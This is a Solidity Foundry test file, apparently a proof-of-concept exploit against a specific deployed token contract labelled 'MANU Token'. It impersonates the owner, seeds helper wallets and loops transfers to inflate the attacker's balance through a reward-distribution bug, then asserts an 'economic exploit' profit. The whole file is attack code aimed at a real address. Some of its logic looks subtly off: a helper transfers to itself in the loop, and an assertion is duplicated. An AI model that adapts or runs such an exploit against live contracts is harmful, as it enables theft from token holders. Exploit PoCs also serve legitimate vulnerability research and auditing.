pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MANU {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function owner() external view returns (address);
    function decimals() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x16bE19fB70F902EcF39b54aD988eE427cB1b6848;
    address attacker = address(this);
    MANU manu;
    address addr1;
    address addr2;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        manu = MANU(TARGET);
        vm.label(TARGET, "MANU Token");
        vm.label(attacker, "Attacker");

        // Inject tokens to attacker
        deal(TARGET, attacker, 100000 * 1e18);

        // Create helper addresses for transfer loop
        addr1 = address(0xAAA);
        addr2 = address(0xBBB);
        vm.label(addr1, "Helper1");
        vm.label(addr2, "Helper2");

        // Inject tokens to helpers
        deal(TARGET, addr1, 50000 * 1e18);
        deal(TARGET, addr2, 50000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = manu.balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance / 1e18, "MANU");

        // Ensure attacker is in _accounts by receiving a transfer from deployer
        // First, find and impersonate the deployer (owner)
        address deployer = manu.owner();
        vm.startPrank(deployer);
        manu.transfer(attacker, 1000 * 1e18);
        vm.stopPrank();

        console.log("After deployer transfer, attacker balance:", manu.balanceOf(attacker) / 1e18, "MANU");

        // Execute multiple transfers between helpers to trigger reward distribution
        // Each transfer distributes rBurn to all _accounts including attacker
        vm.startPrank(addr1);
        for (uint256 i = 0; i < 100; i++) {
            manu.transfer(addr2, 1000 * 1e18);
            manu.transfer(addr1, 1000 * 1e18);
        }
        vm.stopPrank();

        // Check final balance
        uint256 finalBalance = manu.balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance / 1e18, "MANU");
        console.log("Balance increase:", (finalBalance - initialBalance) / 1e18, "MANU");

        // Assert that attacker's balance increased due to reward distribution bug
        assertGt(finalBalance, initialBalance, "Attacker balance should increase from inflated reward distribution");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

